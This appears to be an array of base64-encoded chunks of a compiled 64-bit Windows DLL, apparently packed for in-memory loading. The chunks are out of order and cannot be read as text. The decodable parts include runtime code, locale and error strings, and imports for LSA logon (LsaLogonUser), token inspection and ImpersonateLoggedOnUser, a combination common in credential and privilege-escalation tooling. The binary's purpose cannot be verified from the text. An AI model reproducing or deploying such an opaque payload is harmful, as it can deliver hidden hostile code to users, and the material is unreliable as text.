EiNVCRASIlEJDiDZCQwAINkJCgAg2QkIABIjUwkaEUzyUyLw+hGJQAAi9hIhf90CEiLTCRASIkPSI1MJGhIi9boch8AAIvIuAMAAACE2HUMg/kBdBqD+QJ1E+sF9sMBdAe4BAAAAOsH9sMCdQIzwIB8JGAAdAxIi0wkWIOhyAAAAP1Ii0wkeEgzzOhEY///SIHEgAAAAF9eW8PMSIlcJBhXSIHsgAAAAEiLBQztAABIM8RIiUQkeEiL+UiL2kiNTCRASYvQ6MWK//9IjUQkQEiNVCRgSIlEJDiDZCQwAINkJCg','GYAIABjAGEAbABsAGkAbgBnACAAYQBuACAATQBTAEkATAAtAGMAbwBtAHAAaQBsAGUAZAAgACgALwBjAGwAcgApACAAZgB1AG4AYwB0AGkAbwBuACAAZgByAG8AbQAgAGEAIABuAGEAdABpAHYAZQAgAGMAbwBuAHMAdAByAHUAYwB0AG8AcgAgAG8AcgAgAGYAcgBvAG0AIABEAGwAbABNAGEAaQBuAC4ADQAKAAAAAABSADYAMAAzADQADQAKAC0AIABpAG4AYwBvAG4AcwBpAHMAdABlAG4AdAAgAG8AbgBlAHgAaQB0ACAAYgBlAGcAaQBuAC0AZQBuAGQAIAB2AGEAcgBpAGEAYgBsAGUAcwANAAoAAAAAAEQATwBNAEEASQBOACAAZQByAHIAbwByAA0ACgAAAAAAUwBJAE4ARwAgAGUAcgByAG8AcgANAAoAAAAAAAAAAABUAEwATwBTAFMAIABlAHIAcgBvAHIADQAKAAAADQAKAAAAAAAAAAAAcgB1AG4AdABpAG0AZQAgAGUAcgByAG8AcgAgAAAAAABSAHUAb','AAAGUAcwAtAHUAeQAAAAAAAABlAHMALQB2AGUAAAAAAAAAZQB0AC0AZQBlAAAAAAAAAGUAdQAtAGUAcwAAAAAAAABmAGEALQBpAHIAAAAAAAAAZgBpAC0AZgBpAAAAAAAAAGYAbwAtAGYAbwAAAAAAAABmAHIALQBiAGUAAAAAAAAAZgByAC0AYwBhAAAAAAAAAGYAcgAtAGMAaAAAAAAAAABmAHIALQBmAHIAAAAAAAAAZgByAC0AbAB1AAAAAAAAAGYAcgAtAG0AYwAAAAAAAABnAGwALQBlAHMAAAAAAAAAZwB1AC0AaQBuAAAAAAAAAGgAZQAtAGkAbAAAAAAAAABoAGkALQBpAG4AAAAAAAAAaAByAC0AYgBhAAAAAAAAAGgAcgAtAGgAcgAAAAAAAABoAHUALQBoAHUAAAAAAAAAaAB5AC0AYQBtAAAAAAAAAGkAZAAtAGkAZAAAAAAAAABpAHMALQBpAHMAAAAAAAAAaQB0AC0AYwBoAAA','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','bBEAQCLQwiJBatEAQBIi4MgAgAASI','23gdW2DexgDcmeBeyAiBZMZdl5Ii0Mwg3gIAHQS6KS9//9Ii0swTGNRCEwD0OsDRTPSTYXSdDoPtoQkmAAAAEyLzU2LxolEJDhIi4QkkAAAAEiL1kiJRCQwi4QkiAAAAEiLy4lEJChIiXwkIEH/0us8SIuEJJAAAABMi81Ni8','AAQAAAERxAYABAAAASHEBgAEAAABMcQGAAQAAAFBxAYABAAAAVHEBgAEAAABYcQGAAQAAAGBxAYABAAAAbHEBgAEAAABwcQGAAQAAAHRxAYABAAAAeHEBgAEAAAB8cQGAAQAAAIBxAYABAAAAhHEBgAEAAACIcQGAAQAAAIxxAYABAAAAkHEBgAEAAACUcQGAAQAAAJhxAYABAAAAnHEBgAEAAACgcQGAAQAAAKRxAYABAAAAqHEBgAEAAACscQGAAQAAALBxAYABAAAAtHEBgAEAAAC4cQGAAQAAALxxAYABAAAAwHEBgAEAAADEcQGAAQAAAMhxAYABAAAAzHEBgAEAAADQcQGAAQAAANRxAYABAAAA2HEBgAEAAADccQGAAQAAAOBxAYABAAAA5HEBgAEAAADocQGAAQAAAPhxAYABAAAACHIBgAEAAAAQcgGAAQAAACByAYABAAAAOHIBgAEAAABIcgGAAQAAAGByAYABAAAAgHIBgAEAAACgcgGAAQAAAMByAYABAAAA4HIBgAEAAAAAcwGAAQAAAChzAYABAAAASHMBgAEAAABwcwGAAQAAAJBzAYABAAAAuHMBgAEAAADYcwGAAQAAAOhzAYABAAAA7HMBgAEAAAD4cwGAAQAAAAh0AYABAAAALHQBgAEAAAA4dAGAAQAAAEh0AYABAAAAWHQBgAEAAAB4dAGAAQAAAJh0AYABAAAAwHQBgAEAAADodAGAAQAAABB1AYABAAAAQHUBgAEAAABgdQGAAQAAAIh1AYABAAAAsHUBgAEAAADgdQGAAQAAABB2AYABAAAAx4YBgAEAAAAwdgGAAQAAAEh2AYABAAAAaHYBgAEAAACAdgGAAQAAAKB2AYABAAAAX19iYXNlZCgAAAAAAAAAAF9fY2RlY2wAX19wYXNjYWwAAAAAAAAAAF9fc3RkY2FsbAAAAAAAAABfX3RoaXNjYWxsAAAAAAAAX19mYXN0Y2FsbAAAAAAAAF9fdmVjdG9yY2FsbAAAAABfX2NscmNhbGwAAABfX2VhYmkAAAAAAABfX3B0cjY0AF9fcmVzdHJpY3QAAAAAAABfX3VuYWxpZ25lZAAAAAAAcmVzdHJpY3QoAAAAIG5ldwAAAAAAAAAAIGRlbGV0ZQA9AAAAPj4AADw8AAAhAAAAPT0AACE9AABbXQAAAAAAAG9wZXJhdG9yAAAAAC0+AAAqAAAAKysAAC0tAAAtAAAAKwAAACYAAAAtPioALwAAACUAAAA8AAAAPD0AAD4AAAA+PQAALAAAACgpAAB+AAAAXgAAAHwAAAAmJgAAfHwAACo9AAArPQAALT0AAC89AAAlPQAAPj49ADw8PQAmPQAAfD0AAF49AABgdmZ0YWJsZScAAAAAAAAAYHZidGFibGUnAAAAAAAAAGB2Y2FsbCcAYHR5cGVvZicAAAAAAAAAAGBsb2NhbCBzdGF0aWMgZ3VhcmQnAAAAAGBzdHJpbmcnAAAAAAAAAABgdmJhc2UgZGVzdHJ1Y3RvcicAAAAAAABgdmVjdG9yIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGBkZWZhdWx0IGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAYHNjYWxhciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAGB2aXJ0dWFsIGRpc3BsYWNlbWVudCBtYXAnAAAAAAAAYGVoIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAAAAAAGBlaCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAYGVoIHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpd','EkiF/3QNTIvHM9JIi87oYJP//+jPkv//xwAqAAAA6MSS//+LGIB8JFgAdAxIi0wkUIOhyAAAAP2Lw0yNXCRgSYtbEEmLcyBJi+Nfw0iF9nQLSIX/D4SJAAAAiAZIhdt0VccDAQAAAOtNg2QkeABIjUwkeEyNhCSIAAAASIlMJDhIg2QkMACLSARBuQEAAAAz0ol8JChIiXQkIP8VS1QAAIXAdBmDfCR4AA+FZP///0iF23QCiQMz2+lo/////xVoUwAAg/h6D4VH////SIX2dBJIhf90DUyLxzPSSIvO6JCS///o/5H//7siAAAAiRjom43//+ks////zMxIg+w4SINkJCAA6GX+//9Ig8Q4w0iJXCQISIl0JBBXSIPsQIvaSIvRSI1MJCBBi/lBi/DonJD//0iLRCQoD7bTQIR8Ahl1HoX2dBRIi0QkIEiLiAgBAAAPtwRRI8brAjPAhcB0BbgBAAAAgHwkOAB0DEiLTCQwg6HIAAAA/UiLXCRQSIt0JFhIg8RAX8PMzMyL0UG5BAAA','NQARMK/Z13E1jy0GNfgJNi8FJ99hJO/l8FUiL10jB4gJKjQSCi0wF6IlMFejrBIlcvehIK/553USLBbTjAACL3kUDwutvRIsFpuMAAA+6degfRIvTRAPHi/hEK+hMjU3oQYsBi8+L0NPoQYvNQQvCQSPXRIvSQYkBTY1JBEHT4kwr9nXcTWPTQY1+Ak2Lykn32Uk7+nwVSIvXSMHiAkqNBIqLTAXoiUwV6OsEiVy96Egr/nndSItV0EQrJSvjAABBisxB0+D3XcQbwCU','AAABpbnZhbGlkIGFyZ3VtZW50AAAAAAAAAABubyBzcGFjZSBvbiBkZXZpY2UAAAAAAABubyBzdWNoIGZpbGUgb3IgZGlyZWN0b3J5AAAAAAAAAGZ1bmN0aW9uIG5vdCBzdXBwb3J0ZWQAAG5vIGxvY2sgYXZhaWxhYmxlAAAAAAAAAG5vdCBlbm91Z2ggbWVtb3J5AAAAAAAAAHJlc291cmNlIHVuYXZhaWxhYmxlIHRyeSBhZ2FpbgAAY3Jvc3MgZGV2aWNlIGxpbmsAAAAAAAAAb3BlcmF0aW9uIGNhbmNlbGVkAAAAAAAAdG9vIG1hbnkgZmlsZXMgb3BlbgAAAAAAcGVybWlzc2lvbl9kZW5pZWQAAAAAAAAAYWRkcmVzc19pbl91c2UAAGFkZHJlc3Nfbm90X2F2YWlsYWJsZQAAAGFkZHJlc3NfZmFtaWx5X25vdF9zdXBwb3J0ZWQAAAAAY29ubmVjdGlvbl9hbHJlYWR5X2luX3Byb2dyZXNzAABiYWRfZmlsZV9kZXNjcmlwdG9yAAAAAABjb25uZWN0aW9uX2Fib3J0ZWQAAAAAAABjb25uZWN0aW9uX3JlZnVzZWQAAAAAAABjb25uZWN0aW9uX3Jlc2V0AAAAAAAAAABkZXN0aW5hdGlvbl9hZGRyZXNzX3JlcXVpcmVkAAAAAGJhZF9hZGRyZXNzAAAAAABob3N0X3VucmVhY2hhYmxlAAAAAAAAAABvcGVyYXRpb25faW5fcHJvZ3Jlc3MAAABpbnRlcnJ1cHRlZAAAAAAAaW52YWxpZF9hcmd1bWVudAAAAAAAAAAAYWxyZWFkeV9jb25uZWN0ZWQAAAAAAAAAdG9vX21hbnlfZmlsZXNfb3BlbgAAAAAAbWVzc2FnZV9zaXplAAAAAGZpbGVuYW1lX3Rvb19sb25nAAAAAAAAAG5ldHdvcmtfZG93bgAAAABuZXR3b3JrX3Jlc2V0AAAAbmV0d29ya191bnJlYWNoYWJsZQAAAAAAbm9fYnVmZmVyX3NwYWNlAG5vX3Byb3RvY29sX29wdGlvbgAAAAAAAG5vdF9jb25uZWN0ZWQAAABub3RfYV9zb2NrZXQAAAAAb3BlcmF0aW9uX25vdF9zdXBwb3J0ZWQAcHJvdG9jb2xfbm90','RIlFx0SLQQRBD7fKZiPKRI1q','8lIiUHwTIlR+HXUSYPgH+ny/f//SYP4IA+G4QAAAPbBD3UODxAECkiDwRBJg+gQ6x0PEAwKSIPBIIDh8A8QRArwQQ8RC0iLwUkrw0wrwE2LyEnB6Qd0Zg8pQfDrCmaQDylB4A8pSfAPEAQKDxBMChBIgcGAAAAADylBgA8pSZAPEEQKoA8QTAqwSf/JDylBoA8pSbAPEEQKwA8QTArQDylBwA8pSdAPEEQK4A8QTArwda0PKUHgSYPgfw8owU2LyEnB6QR0GmYPH4QAAAAAAA8pQfAPEAQKSIPBEEn/yXXvSYPgD3QNSY0ECA8QTALwDxFI8A8pQfBJi8PDDx9AAEEPEAJJjUwI8A8QDApBDxEDDxEJSYvDww8fhAAAAAAAZmZmkGZmZpBmkA+6JXKlAQACD4K5AAAASQPI9sEHdDb2wQF0C0j/yYoECkn/yIgB9sECdA9Ig+kCZosECkmD6AJmiQH2wQR0DUiD6QSLBApJg+gEiQFNi8hJwekFdUFNi8hJwekDdBRIg+kISIsECkn/yUiJAXXwSYPgB02FwHUPSYvDw2ZmZg8fhAAAAAAASSvITIvRSI0UCul9/P//kEiLRAr4TItUCvBIg+kgSIlBGEyJURBIi0QKCEyLFApJ/8lIiUEITIkRddVJg+Af645Jg/ggD4YF////SQPI9sEPdQ5Ig+kQDxAECkmD6BDrG0iD6RAPEAwKSIvBgOHwDxAECg8RCEyLwU0rw02LyEnB6Qd0aA8pAesNZg8fRAAADylBEA8pCQ8QRArwDxBMCuBIgemAAAAADylBcA8pSWAPEEQKUA8QTApASf/JDylBUA8pSUAPEEQKMA8QTAogDylBMA8pSSAPEEQKEA8QDAp1rg8pQRBJg+B/DyjBTYvIScHpBHQaZmYPH4QAAAAAAA8pAUiD6RAPEAQKSf/JdfBJg+APdAhBDxAKQQ8RCw8pAUmLw8PMzMxAU0iD7CC6CAAAAI1KGOhtFwAASIvISIvY/xWx5AAASIkFgsIBAEiJBXPCAQBIhdt1BY1DGOsGSIMjADPASIPEIFvDzEiJXCQISIl0JBBIiXwkGEFUQVZBV0iD7CBMi+HoLxUAAJBIiw07wgEA/xVl5AAATIvwSIsNI8IBAP8VVeQAAEiL2Ek7xg+CmwAAAEiL+Ekr/kyNfwhJg/8ID4KHAAAASYvO6JkWAABIi/BJO8dzVboAEAAASDvCSA9C0EgD0Eg70HIRSYvO6K0XAAAz20iFwHUa6wIz20iNViBIO9ZySUmLzuiRFwAASIXAdDxIwf8DSI0c+EiLyP8Vz+MAAEiJBaDBAQBJi8z/Fb/jAABIiQNIjUsI/xWy4wAASIkFe8EBAEmL3OsCM9vobxQAAEiLw0iLXCRASIt0JEhIi3wkUEiDxCBBX0FeQVzDzMxIg+wo6Ov+//9I99gbwPfY/8hIg8Qow8xIg+woSIsNvaIBAP8VX+MAAEiFwHQC/9C6AQAAA','AAHOYAAAyot8tmSsAAM1dINJm1P//AQAAAAIAAAACAAAAAQAAAAAAAAAAAAAA6CgBgAEAAADwKAGAAQAAAAEAAAAWAAAAAgAAAAIAAAADAAAAAgAAAAQAAAAYAAAABQAAAA0AAAAGAAAACQAAAAcAAAAMAAAACAAAAAwAAAAJAAAADAAAAAoAAAAHAAAACwAAAAgAAAAMAAAAFgAAAA0AAAAWAAAADwAAAAIAAAAQAAAADQAAABEAAAASAAAAEgAAAAIAAAAhAAAADQAAADUAAAACAAAAQQAAAA0AAABDAAAAAgAAAFAAAAARAAAAUgAAAA0AAABTAAAADQAAAFcAAAAWAAAAWQAAAAsAAABsAAAADQAAAG0AAAAgAAAAcAAAABwAAAByAAAACQAAAAYAAAAWAAAAgAAAAAoAAACBAAAACgAAAIIAAAAJAAAAgwAAABYAAACEAAAADQAAAJEAAAApAAAAngAAAA0AAAChAAAAAgAAAKQAAAALAAAApwAAAA0AAAC3AAAAEQAAAM4AAAACAAAA1wAAAAsAAAAYBwAADAAAAAwAAAAIAAAA/////wAAAAAAAAAAAAAAAP//////////gAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////AAAAAEDFAIABAAAAQMUAgAEAAABAxQCAAQAAAEDFAIABAAAAQMUAgAEAAABAxQCAAQAAAEDFAIABAAAAQMUAgAEAAABAxQCAAQAAAEDFAIABAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAA